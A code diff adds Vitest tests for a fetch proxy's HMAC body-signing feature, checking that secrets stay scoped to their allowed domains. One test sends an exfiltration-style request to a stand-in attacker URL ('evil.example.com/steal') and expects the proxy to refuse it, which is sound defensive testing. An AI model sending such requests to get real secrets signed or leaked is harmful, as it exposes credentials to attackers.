@@ -1,3 +1,4 @@
+import { createHmac } from 'node:crypto';
 import { SecretsPipeline } from '@slicc/shared-ts';
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import {
@@ -306,6 +307,89 @@ describe('handleFetchProxyConnectionAsync — synchronous listener attach', () =
         error: expect.stringContaining('fetch-proxy init failed: storage unavailable'),
       },
     ]);
+  });
+});
+
+// Proxy-side HMAC body signing (x-slicc-hmac-sign): the page/agent side never
+// holds the real secret, so it asks the SW proxy to sign the (unmasked) body
+// and attach the result under the header it names — see HMAC_SIGN_HEADER.
+describe('handleFetchProxyConnection — x-slicc-hmac-sign', () => {
+  const HMAC_SECRET = 'job-signing-secret-abcdefghijklmnop';
+  let hmacPipeline: SecretsPipeline;
+
+  beforeEach(async () => {
+    hmacPipeline = new SecretsPipeline({
+      sessionId: 'session-fixed',
+      source: {
+        get: async () => undefined,
+        listAll: async () => [
+          { name: 'SIGNING_KEY', value: HMAC_SECRET, domains: ['worker.example.com'] },
+        ],
+      },
+    });
+    await hmacPipeline.reload();
+  });
+
+  function encodeBase64(s: string): string {
+    return btoa(s);
+  }
+
+  it('signs the request body and strips the sentinel header before fetch', async () => {
+    let fetchHeaders: Record<string, string> | undefined;
+    let fetchBody: unknown;
+    (globalThis as any).fetch = vi.fn(async (_url: string, init: any) => {
+      fetchHeaders = init.headers;
+      fetchBody = init.body;
+      return new Response('ok', { status: 200, statusText: 'OK' });
+    });
+
+    const body = JSON.stringify({ step: 3, status: 'running' });
+    const posts: any[] = [];
+    const port = makePort((m) => posts.push(m));
+    handleFetchProxyConnection(port, hmacPipeline);
+    port.fireMessage({
+      type: 'request',
+      url: 'https://worker.example.com/api/jobs/j1/events',
+      method: 'POST',
+      headers: {
+        'content-type': 'application/json',
+        'x-slicc-hmac-sign': 'SIGNING_KEY:x-job-signature',
+      },
+      bodyBase64: encodeBase64(body),
+    });
+    await new Promise((r) => setTimeout(r, 10));
+
+    expect(new TextDecoder().decode(fetchBody as Uint8Array)).toBe(body);
+    expect(fetchHeaders?.['x-slicc-hmac-sign']).toBeUndefined();
+    expect(fetchHeaders?.['x-job-signature']).toBe(
+      createHmac('sha256', HMAC_SECRET).update(body).digest('hex')
+    );
+  });
+
+  it('response-error when the signing secret is scoped to a different domain', async () => {
+    const fetchSpy = vi.fn();
+    (globalThis as any).fetch = fetchSpy;
+
+    const posts: any[] = [];
+    const port = makePort((m) => posts.push(m));
+    handleFetchProxyConnection(port, hmacPipeline);
+    port.fireMessage({
+      type: 'request',
+      url: 'https://evil.example.com/steal',
+      method: 'POST',
+      headers: {
+        'content-type': 'application/json',
+        'x-slicc-hmac-sign': 'SIGNING_KEY:x-job-signature',
+      },
+      bodyBase64: encodeBase64('{}'),
+    });
+    await new Promise((r) => setTimeout(r, 10));
+
+    expect(fetchSpy).not.toHaveBeenCalled();
+    const errorPost = posts.find((p) => p.type === 'response-error');
+    expect(errorPost?.error).toContain('forbidden');
+    expect(errorPost?.error).toContain('SIGNING_KEY');
+    expect(errorPost?.error).toContain('evil.example.com');
   });
 });
 
